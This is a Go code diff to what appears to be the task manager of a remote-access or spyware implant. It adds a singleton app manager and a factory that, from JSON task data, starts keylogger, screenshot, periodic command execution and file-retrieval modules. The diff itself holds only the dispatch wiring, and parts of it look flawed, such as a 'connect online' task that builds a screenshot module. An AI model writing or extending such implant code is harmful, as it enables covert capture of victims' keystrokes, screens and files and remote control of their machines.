@@ -1,27 +1,30 @@
 package apps
 
 import (
+	"encoding/json"
 	"errors"
 	"fmt"
 	"log"
 	"sync"
 )
 
-type App interface {
-	Start(wg *sync.WaitGroup)
-	Stop() error
-	Validate() error // Validation before start
-}
-
 type AppManager struct {
 	apps map[string]App
 	mu   sync.Mutex
 }
 
-func NewAppManager() *AppManager {
-	return &AppManager{
-		apps: make(map[string]App),
-	}
+var (
+	appManagerInstance *AppManager
+	once               sync.Once
+)
+
+func GetAppManagerInstance() *AppManager {
+	once.Do(func() {
+		appManagerInstance = &AppManager{
+			apps: make(map[string]App),
+		}
+	})
+	return appManagerInstance
 }
 
 func (am *AppManager) GetApp(name string) (App, error) {
@@ -45,13 +48,13 @@ func (am *AppManager) ListApps() []string {
 	return appNames
 }
 
-func (am *AppManager) AddApp(name string, app App) {
+func (am *AppManager) AddApp(name string, app *App) {
 	am.mu.Lock()
 	defer am.mu.Unlock()
 	if am.apps[name] != nil {
-		log.Printf("App %s was already exists. Overwriting app", name)
+		log.Printf("App %s already exists. Overwriting app", name)
 	}
-	am.apps[name] = app
+	am.apps[name] = *app
 }
 
 func (am *AppManager) RemoveApp(name string) {
@@ -83,4 +86,48 @@ func (am *AppManager) StopAll() {
 			fmt.Printf("Stopped app: %s\n", name)
 		}
 	}
+}
+
+func (am *AppManager) NewAppFactory(appData AppData) error {
+	var app App = nil
+	var err error = nil
+
+	switch appData.Type {
+	case ChangeConfigTask:
+		// TODO: change config on demand
+		break
+	case ScreenShotTask:
+		app, err = NewApp[ScreenshotApp](appData.Params)
+		break
+	case KeyLoggerTask:
+		app, err = NewApp[KeyLoggerApp](appData.Params)
+		break
+	case CommandTask:
+		app, err = NewApp[PeriodicCommandApp](appData.Params)
+		break
+	case GetFileTask:
+		app, err = NewApp[PeriodicGetFileApp](appData.Params)
+		break
+	case ConnectOnlineTask:
+		app, err = NewApp[ScreenshotApp](appData.Params)
+		break
+	default:
+		err = errors.New("unknown app type")
+	}
+	if err != nil {
+		return err
+	}
+	if app == nil {
+		return errors.New("app: app not found")
+	}
+	am.AddApp(appData.Name, &app)
+	return nil
+}
+
+func NewApp[T any](raw json.RawMessage) (*T, error) {
+	var app T
+	if err := json.Unmarshal(raw, &app); err != nil {
+		return nil, err
+	}
+	return &app, nil
 }
